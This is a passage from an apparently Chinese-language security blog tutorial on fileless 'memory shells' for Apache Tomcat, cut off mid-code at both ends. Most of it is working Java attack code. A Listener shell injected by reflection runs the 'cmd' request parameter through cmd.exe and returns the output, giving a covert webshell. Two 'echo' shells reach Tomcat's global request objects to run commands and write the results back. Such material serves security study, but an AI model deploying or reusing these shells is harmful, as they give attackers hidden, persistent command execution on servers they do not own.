添加 servletMappings</span></span><br><span class="line">                standardContext.addServletMapping(urlPattern, servletName);</span><br><span class="line">                <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">                writer.println(<span class="string">&quot;inject KoishiMemServlet success !&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>





<h2 id="四、Listener内存马"><a href="#四、Listener内存马" class="headerlink" title="四、Listener内存马"></a>四、Listener内存马</h2><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p>请求网站的时候, 程序先执行listener监听器的内容：Listener -&gt; Filter -&gt; Servlet</p>
<p>在应用中可能调用的监听器如下：</p>
<blockquote>
<ul>
<li><p>ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）</p>
</li>
<li><p>ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）</p>
</li>
<li><p>ServletRequestListener：对 Request 请求进行监听（创建、销毁）</p>
</li>
<li><p>ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）</p>
</li>
<li><p>javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听</p>
</li>
<li><p>javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听</p>
</li>
</ul>
</blockquote>
<p>在 ServletRequestListener 接口中，提供两个方法：<code>requestInitialized</code> 和 <code>requestDestroyed</code>，两个方法均接收 ServletRequestEvent 作为参数，ServletRequestEvent 中又储存了 ServletContext 对象和 ServletRequest 对象，因此在访问请求过程中我们可以在 request 创建和销毁时实现自己的恶意代码，完成内存马的实现。 从中还可以获取到 StandardContext 对象，也就是可以在Listener的基础上添加动态FIlter。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623578410672.png"
                      alt="img"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\1623640456652.png"
                      alt="img"
                ></p>
<p>Tomcat 中 EventListeners 存放在 StandardContext 的 applicationEventListenersObjects 属性中，同样可以使用 StandardContext 的相关 add 方法添加。</p>
<p>除了 EventListener，Tomcat 还存在了 LifecycleListener。但是用起来一定是不如 ServletRequestListener。 因为实现了<code>LifecycleListener</code>接口的监听器一般作用于tomcat初始化启动阶段，此时客户端的请求还没进入解析阶段，不适合用于内存马 。</p>
<p>（也就是说，Listener内存马大多数都是使用的他的 requestDestroyed 方法来保存我们的恶意代码，这样能确保被解析了）</p>
<h3 id="内存马代码"><a href="#内存马代码" class="headerlink" title="内存马代码"></a>内存马代码</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Listener;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.tomcat.util.ClassUtil;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">KoishiMemListener</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 获取 StandardContext#addApplicationEventListener</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//新建 Listener 不用像之前那样使用 wrapper 包装了，直接add即可</span></span><br><span class="line">            <span class="comment">//Class&lt;?&gt; classListener = ClassUtil.getClass(ClassUtil.LISTENER_STRING);</span></span><br><span class="line">            <span class="type">MyListener</span> <span class="variable">listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">            standardContext.addApplicationEventListener(listener);</span><br><span class="line"></span><br><span class="line">            <span class="type">PrintWriter</span> <span class="variable">writer</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">            writer.println(<span class="string">&quot;inject KoishiMemListener success !&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                    request.getResponse().getWriter().flush();</span><br><span class="line">                    request.getResponse().getWriter().close();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>



<h2 id="五、Tomcat-回显马"><a href="#五、Tomcat-回显马" class="headerlink" title="五、Tomcat 回显马"></a>五、Tomcat 回显马</h2><p>tomcat马构造基础 <a class="link"   href="https://www.cnblogs.com/nice0e3/p/14622879.html" >Java安全之基于Tomcat实现内存马 - nice_0e3 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>本段参考：</p>
<p>文章一： <a class="link"   href="https://www.cnblogs.com/nice0e3/p/14891711.html#0x01-tomcat%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE" >Java安全之反序列化回显与内存马 - nice_0e3 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>文章二：<a class="link"   href="https://www.cnblogs.com/akka1/p/16201272.html#autoid-3-0-0" >Tomcat通用回显学习 - akka1 - 博客园 (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="通用回显"><a href="#通用回显" class="headerlink" title="通用回显"></a>通用回显</h3><blockquote>
<p>按照我个人的理解来说其实只要能拿到<code>Request</code> 和<code>Response</code>对象即可进行回显的构造，当然这也是众多方式的一种。也是目前用的较多的方式。比如在Tomcat 全局存储的<code>Request</code> 和<code>Response</code>对象，进行获取后则可以在tomcat这个容器下进行回显。而某些漏洞的方式会从漏洞的位置去寻找存储<code>Request</code> 和<code>Response</code>对象的地方。</p>
</blockquote>
<p><a class="link"   href="https://mp.weixin.qq.com/s?__biz=MzIwNDA2NDk5OQ==&mid=2651374294&idx=3&sn=82d050ca7268bdb7bcf7ff7ff293d7b3" >基于全局储存的新思路 | Tomcat的一种通用回显方法研究 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>说明在Tomcat启动的时候会调用该位置的 dorun 方法</p>
<p>大致思路</p>
<blockquote>
<ul>
<li><p>获取到<code>Http11Processor</code>对象即可获取到<code>Request</code>，<code>Response</code> ， <code>Http11Processor</code>继承<code>AbstractProcessor</code>类。 </p>
</li>
<li><p>而<code>AbstractProcessor</code>类中可见有<code>Request</code>，<code>Response</code>这两对象。 <code>AbstractProcessor</code>调用<code>this.register</code>将前面创建的<code>Http11Processor</code>对象进行传递。 随后调用<code>processor.getRequest().getRequestProcessor()</code>获取<code>RequestInfo</code> 。 </p>
</li>
<li><p>调用获取到的<code>RequestInfo</code>,这里为<code>rp</code>。rp的<code>setGlobalProcessor</code>将global进行传递，而<code>setGlobalProcessor</code>方法里面会调用<code>global.addRequestProcessor</code>将rp添加进去。 </p>
</li>
<li><p>再往后需要寻找存储<code>AbstractProtocol</code>类或继承<code>AbstractProtocol</code>类的子类。这里寻找到的是<code>Connector</code>成员变量中为<code>protocolHandler</code>属性的值，而 <code>Http11AprProtocol</code>类实现了该接口。 </p>
</li>
<li><p>在Tomcat启动过程中会将Connector放入Service中。 </p>
</li>
<li><p>StandardContext 中有我们需要的 service。</p>
</li>
</ul>
</blockquote>
<p>最后调用链为</p>
<p>（前面几步通过 <code>currentThread</code> 最终获取<code>StandardContext</code>， 因为我的tomcat版本问题，我改用了反射获取的方式）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())---&gt;StandardService---&gt;Connector---&gt;AbstractProtocol$ConnectoinHandler---&gt;RequestGroupInfo(global)---&gt;RequestInfo---&gt;Request---&gt;Response</span><br></pre></td></tr></table></figure></div>





<h4 id="tomcat马通用回显马："><a href="#tomcat马通用回显马：" class="headerlink" title="tomcat马通用回显马："></a><strong>tomcat马通用回显马：</strong></h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Service;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Connector;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardService;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.AbstractProtocol;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestGroupInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.RequestInfo;</span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.Response;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationTargetException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**流程</span></span><br><span class="line"><span class="comment"> WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())---&gt;</span></span><br><span class="line"><span class="comment"> StandardService---&gt;Connector---&gt;AbstractProtocol$ConnectoinHandler---&gt;</span></span><br><span class="line"><span class="comment"> RequestGroupInfo(global)---&gt;RequestInfo---&gt;Request---&gt;Response</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(&quot;/demo&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_General</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">        //这里的代码也是为了获取 standardContext，tomcat8.5.77 测试可以使用。8.5.82之后就不行了，getResources返回值为null</span></span><br><span class="line"><span class="comment">        //WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">        org.apache.catalina.loader.WebappClassLoaderBase webappClassLoaderBase = (org.apache.catalina.loader.WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span></span><br><span class="line"><span class="comment">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取运行中的 standardContext，和之前的三个马一样,也可以用上面注释掉的方法，但是我的tomcat版本刚好高了一点，不行。</span></span><br><span class="line">        <span class="comment">//等效流程 WebappClassLoaderBase---&gt;ApplicationContext(getResources().getContext())</span></span><br><span class="line">            <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">            <span class="type">Field</span> <span class="variable">servletfield</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            servletfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) servletfield.get(servletContext);</span><br><span class="line">            <span class="type">Field</span> <span class="variable">contextfield</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            contextfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) contextfield.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                获取 StandardContext 中的 context</span></span><br><span class="line"><span class="comment">                反射获取 ApplicationContext 上下文，因为其为 protected 修饰的</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">context</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span>).getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            context.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">ApplicationContext</span> <span class="operator">=</span> (ApplicationContext)context.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                反射获取context中的service</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">service</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span>).getDeclaredField(<span class="string">&quot;service&quot;</span>);</span><br><span class="line">            service.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardService</span> <span class="variable">standardService</span> <span class="operator">=</span> (StandardService)service.get(ApplicationContext);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                反射获取service中的connectors</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line">            <span class="type">Field</span> <span class="variable">connectors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.catalina.core.StandardService&quot;</span>).getDeclaredField(<span class="string">&quot;connectors&quot;</span>);</span><br><span class="line">            connectors.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            Connector[] connector = (Connector[])connectors.get(standardService);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/**</span></span><br><span class="line"><span class="comment">                现在目的是反射获取 AbstractProtocol$ConnectionHandler 实例，这里可以直接反射获取所有的 AbstractProtocol 类集合，</span></span><br><span class="line"><span class="comment">                对其进行遍历时通过 if 找到正确的AbstractProtocol类 （org.apache.coyote.AbstractProtocol$ConnectionHandler）</span></span><br><span class="line"><span class="comment">            **/</span></span><br><span class="line"><span class="comment">/*      我看其他师傅也有这种写法，没研究啥原理，这样写的话，就可以少最外层的for循环和if判断，这里的connectors1[0]就很玄幻，为啥确定在这，因为想在短时间内学完内存马，急着用所以没仔细研究，以后有空回头来研究</span></span><br><span class="line"><span class="comment">            ProtocolHandler protocolHandler = connectors1[0].getProtocolHandler();</span></span><br><span class="line"><span class="comment">            Field handler = org.apache.coyote.AbstractProtocol.class.getDeclaredField(&quot;handler&quot;);</span></span><br><span class="line"><span class="comment">            handler.setAccessible(true);</span></span><br><span class="line"><span class="comment">            org.apache.tomcat.util.net.AbstractEndpoint.Handler handler1 = (AbstractEndpoint.Handler) handler.get(protocolHandler);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">            Class&lt;?&gt;[] AbstractProtocol_list = Class.forName(<span class="string">&quot;org.apache.coyote.AbstractProtocol&quot;</span>).getDeclaredClasses();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (Class&lt;?&gt; aClass : AbstractProtocol_list) &#123;</span><br><span class="line">                <span class="keyword">if</span> (aClass.getName().length()==<span class="number">52</span>)&#123;</span><br><span class="line">                    java.lang.reflect.<span class="type">Method</span> <span class="variable">getHandlerMethod</span> <span class="operator">=</span> org.apache.coyote.AbstractProtocol.class.getDeclaredMethod(<span class="string">&quot;getHandler&quot;</span>,<span class="literal">null</span>);</span><br><span class="line">                    getHandlerMethod.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        反射获取global 和 RequestGroupInfo中的 processors</span></span><br><span class="line"><span class="comment">                    **/</span></span><br><span class="line">                    <span class="type">Field</span> <span class="variable">globalField</span> <span class="operator">=</span> aClass.getDeclaredField(<span class="string">&quot;global&quot;</span>);</span><br><span class="line">                    globalField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">processors</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestGroupInfo&quot;</span>).getDeclaredField(<span class="string">&quot;processors&quot;</span>);</span><br><span class="line">                    processors.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        反射实现了 RequestGroupInfo(global) ，调用方法获取到了全局的 requestGroupInfo</span></span><br><span class="line"><span class="comment">                    */</span></span><br><span class="line">                    org.apache.coyote.<span class="type">RequestGroupInfo</span> <span class="variable">requestGroupInfo</span> <span class="operator">=</span> (org.apache.coyote.RequestGroupInfo) globalField.get(getHandlerMethod.invoke(connector[<span class="number">0</span>].getProtocolHandler(), <span class="literal">null</span>));</span><br><span class="line">                    java.util.List&lt;RequestInfo&gt; RequestInfo_list = (java.util.List&lt;RequestInfo&gt;) processors.get(requestGroupInfo);</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">req</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;org.apache.coyote.RequestInfo&quot;</span>).getDeclaredField(<span class="string">&quot;req&quot;</span>);</span><br><span class="line">                    req.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="comment">/**</span></span><br><span class="line"><span class="comment">                        这里就遍历每个 requestInfo ，获取他们的req,再获取 response，就能达到回显的目的了</span></span><br><span class="line"><span class="comment">                    * */</span></span><br><span class="line">                    <span class="keyword">for</span> (RequestInfo requestInfo : RequestInfo_list) &#123;</span><br><span class="line">                        org.apache.coyote.<span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span> (org.apache.coyote.Request )req.get(requestInfo);</span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request2</span> <span class="operator">=</span> ( org.apache.catalina.connector.Request)request1.getNote(<span class="number">1</span>);</span><br><span class="line">                        org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response2</span> <span class="operator">=</span> request2.getResponse();</span><br><span class="line">                        response2.getWriter().write(<span class="string">&quot;TomcatEcho_General Injection success !&quot;</span>);</span><br><span class="line">                        <span class="type">InputStream</span> <span class="variable">whoami</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>).getInputStream();</span><br><span class="line">                        <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(whoami);</span><br><span class="line">                        <span class="type">int</span> b ;</span><br><span class="line">                        <span class="keyword">while</span> ((b = bis.read())!=-<span class="number">1</span>)&#123;</span><br><span class="line">                            response2.getWriter().write(b);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line">        <span class="built_in">this</span>.doPost(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getObj</span><span class="params">(Object obj, String attr)</span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(attr);</span><br><span class="line">            f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="keyword">return</span> f.get(obj);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>



<p>文章二的大佬还提供了另一个可以在 7，8，9 中均可使用的链子（以下是他说的上面的链子在 8 中会有小小的版本限制，在7中又缺失context的话）</p>
<blockquote>
<p>tomcat 8 的小版本有限制主要原因是</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="R:\notes\java\pic\2804790-20220428003041172-926221891.png"
                      alt="image-20220427234613127"
                ></p>
<p>原因是<code>Tomcat7</code>获取到的<code>WebappClassLoaderBase</code>中没有context属性，所以会利用失败）</p>
</blockquote>
<p>tomcat 8 版本小问题确实存在，我上面也说了，我也遇到了。这个7这个base中不存在context属性。这俩在我看来的解决办法就是我上面提到的，使用 <code>getSession</code> 反射的方式来获取。当然，这个师傅也提供了他的解决思路，具体如下，我们也可以看看。</p>
<h4 id="马2"><a href="#马2" class="headerlink" title="马2"></a>马2</h4><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tomcat.memshell.Tomcat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.coyote.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletException;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServlet;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Writer;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebServlet(name = &quot;Tomcat7Servlet&quot;, value = &quot;/Tomcat7Servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TomcatEcho_General_789</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> ServletException, IOException &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">boolean</span> flag=<span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(),<span class="string">&quot;threads&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt; threads.length;i++)&#123;</span><br><span class="line">                Thread thread=threads[i];</span><br><span class="line">                String threadName=thread.getName();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    Object target= getField(thread,<span class="string">&quot;target&quot;</span>);</span><br><span class="line">                    Object this0=getField(target,<span class="string">&quot;this$0&quot;</span>);</span><br><span class="line">                    Object handler=getField(this0,<span class="string">&quot;handler&quot;</span>);</span><br><span class="line">                    Object global=getField(handler,<span class="string">&quot;global&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    ArrayList processors=(ArrayList) getField(global,<span class="string">&quot;processors&quot;</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; processors.size(); j++) &#123;</span><br><span class="line">                        <span class="type">RequestInfo</span> <span class="variable">requestInfo</span> <span class="operator">=</span> (RequestInfo) processors.get(j);</span><br><span class="line">                        <span class="keyword">if</span>(requestInfo!=<span class="literal">null</span>)&#123;</span><br><span class="line">                            Request req=(Request) getField(requestInfo,<span class="string">&quot;req&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Request</span> <span class="variable">request1</span> <span class="operator">=</span>(org.apache.catalina.connector.Request) req.getNote(<span class="number">1</span>);</span><br><span class="line">                            org.apache.catalina.connector.<span class="type">Response</span> <span class="variable">response1</span> <span class="operator">=</span>request1.getResponse();</span><br><span class="line"></span><br><span class="line">                            Writer writer=response.getWriter();</span><br><span class="line">                           